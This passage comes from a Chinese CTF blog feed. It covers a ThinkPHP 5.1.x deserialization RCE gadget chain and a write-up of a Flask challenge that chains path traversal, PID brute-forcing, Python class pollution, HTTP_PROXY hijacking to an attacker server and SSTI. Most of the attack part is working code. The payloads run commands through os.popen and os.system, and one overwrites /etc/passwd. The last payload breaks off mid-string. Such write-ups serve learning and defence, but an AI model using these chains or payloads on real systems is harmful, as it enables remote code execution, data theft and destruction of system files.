class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141151590.png" alt="image-20240306141151590"></p><p>这里会把$filters数组末尾的null弹出, 之后就成功rce</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141253331.png" alt="image-20240306141253331"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141316024.png" alt="image-20240306141316024"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5-1-x反序列化&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-1-x反序列化&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.1.x反序列化&quot;&gt;&lt;/a&gt;ThinkPHP 5.1.x反序列化&lt;/h1&gt;&lt;p&gt;我们已经学习</summary>
      
    
    
    
    
    <category term="ThinkPHP反序列化" scheme="http://example.com/tags/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP学习</title>
    <link href="http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-03-04T04:45:07.000Z</published>
    <updated>2024-03-04T14:27:09.368Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133210500.png" alt="image-20240304133210500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Swagger docs</title>
    <link href="http://example.com/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/"/>
    <id>http://example.com/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/</id>
    <published>2024-03-01T13:05:49.000Z</published>
    <updated>2024-03-02T14:26:13.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h1><p>一进去是一个文档内容, 还以为是容器没弄好</p><p>仔细看像是一些api的文档,看不懂,但是没关系, 直接扔给gpt, 让他举出几个请求的例子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301211339462.png" alt="image-20240301211339462"></p><p>这里有四条api接口, 简单浏览一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api-base/v0/register</span><br><span class="line">#注册</span><br><span class="line">/api-base/v0/login</span><br><span class="line">#登录</span><br><span class="line">/api-base/v0/update</span><br><span class="line">#修改密码</span><br><span class="line">/api-base/v0/search</span><br><span class="line">#搜索文件</span><br></pre></td></tr></table></figure><p>由于已经知道是原型链污染, 其实可以猜测一下</p><ol><li><p>修改秘密的地方可以进行污染, 当然注册的地方也有一个插入的操作, 也可能存在污染</p></li><li><p>搜索文件的地方可以读取任意文件, 读取app的源码</p></li></ol><p>当然这只是猜测</p><p>先通过api注册登录获得token</p><p>这里的token一眼jwt 解一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301214129531.png" alt="image-20240301214129531"></p><p>这里会直接把密码也存在里面了, 但是并不知道私钥,并且爆破不出来,不能进行伪造</p><p>token先放一放</p><p>简单尝试这个search的api后发现确实存在任意文件读取</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301212720010.png" alt="image-20240301212720010"></p><p>这里并不能使用通配符, 也读不到app.py config.py web.py这样的源码</p><p>或许应该寻找源码的文件名</p><p>可谓是百思不得其解, 疑惑之下google 简单搜索了一下 词条 “flask源文件读取”</p><p><strong>柳暗花明又一村</strong></p><p>我发现了这篇文章</p><p><a href="https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><p>我们可以通过访问..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdline这个文件来得到当前运行的程序</p><blockquote><p>  proc 目录通常存储着进程动态运行的各种信息，是一种虚目录 、&#x2F;proc&#x2F;[pid]&#x2F;  表示存储这进程id为pid 的 进程信息，当前进程 pid 用self 代替，即 &#x2F;proc&#x2F;self&#x2F;.</p><pre><code>    /proc/[pid]/cmdline 下可读出进程在终端输入过的命令命令 </code></pre></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222256761.png" alt="image-20240301222256761"></p><p>这下就可以直接读取源文件了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222546644.png" alt="image-20240301222546644"></p><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/v2/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_info</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> file_path:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">id</span>:</span><br><span class="line">                    data = json.loads(file_content)</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> data[<span class="string">&#x27;users&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> user[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">int</span>(<span class="built_in">id</span>):</span><br><span class="line">                            <span class="keyword">if</span> user:</span><br><span class="line">                                <span class="keyword">return</span> user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">            <span class="keyword">return</span> file_content</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>,<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>这里只有api.py的源码, 但是并不是我们想要的</p><p>这里&#x2F;proc&#x2F;[pid]&#x2F;cmdline</p><p>既然这个是pid进程, 理论上进程数最大值为32768, 我们可以写个脚本尝试爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.26:22401//api-base/v0/search?file=../../../../../proc/&#123;&#125;/cmdline&amp;type=text&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.bzD2zo_oMqcmwR5IS_KWlaVChT30zADxFY-wxv91gFo;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32769</span>):</span><br><span class="line">    payload = url.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    res = requests.get(url=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(parse.quote(res.text))</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python%00api.py%00</span><br><span class="line">8</span><br><span class="line">python%00app.py%00</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>这里却又爆出来了app.py但是并不能把他读取出来… </p><p>不知道是否是因为权限问题</p><p>回头看了下api.py的源码, 这里面的路由为&#x2F;v2&#x2F;users而不是一开始读文件的路由&#x2F;api-base&#x2F;v0&#x2F;search</p><p>但是也访问不到&#x2F;v2&#x2F;users这条路由</p><p>这里怎么也读取不到, 用题解里的方法也不行, 由harder学长的提示就直接看源码了</p><p>在修改密码的路由下调用了一个update函数,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update(new_password, User)</span><br></pre></td></tr></table></figure><p> 跟进会发现这正是一个经典的merge函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):   <span class="comment"># merge ԭ������Ⱦ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br></pre></td></tr></table></figure><p>这里将new_password直接合并到User</p><p>我们跟进User看看的原型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里重载了_<em>init</em>_, 那么就可以通过init来污染了</p><p>但是flag在哪并不知道</p><p>这里发现加载了os模块, 那么就可以控制环境变量, 或许flag就在环境变量中</p><p>这里简单尝试一下污染respone0</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101737306.png" alt="image-20240302101737306"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101751821.png" alt="image-20240302101751821"></p><p>可以看见已经污染成功了</p><p>但是这里并没有什么用</p><p>仔细观察源码发现search的地方用了一次渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(data.text)</span><br></pre></td></tr></table></figure><p>而这个data来源于api.py读取的文件内容</p><p>稍微观察api.py 可以预测到当前还存在一个user的json文件</p><p>这样就又可以想到:</p><p>利用污染向user文件中插入一个模板字符串, 再把它读取出来渲染造成ssti</p><p>由于没有导入user,这里并不能修改user的内容</p><p>在harder学长的提示下 开始尝试污染http_proxy变量</p><h2 id="法一-污染HTTP-PROXY"><a href="#法一-污染HTTP-PROXY" class="headerlink" title="法一(污染HTTP_PROXY)"></a>法一(污染HTTP_PROXY)</h2><p>首先我们在vps上运行一个代理(当然这里是本地测试, 也可以不要vps), 将接收到的请求直接返回一个模板字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>之后对HTTP_PROXY环境变量进行污染, 使得所有的http请求全部代理到我们的服务器上</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;HTTP_PROXY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://192.168.1.11:8899/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>开启vps进行监听</p><p>在此调用search的api</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302144331876.png" alt="image-20240302144331876"></p><p>可以看见这里返回49, 正是我们模板字符串被渲染后的值</p><p>之后就是ssti的利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302154000485.png" alt="image-20240302154000485"></p><h2 id="法二-Flask变量污染"><a href="#法二-Flask变量污染" class="headerlink" title="法二(Flask变量污染)"></a>法二(Flask变量污染)</h2><p>参考:</p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><h3 id="spec-获取sys"><a href="#spec-获取sys" class="headerlink" title="__spec__获取sys"></a><code>__spec__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 222 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="loader-获取sys"><a href="#loader-获取sys" class="headerlink" title="__loader__获取sys"></a><code>__loader__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 111 &gt; 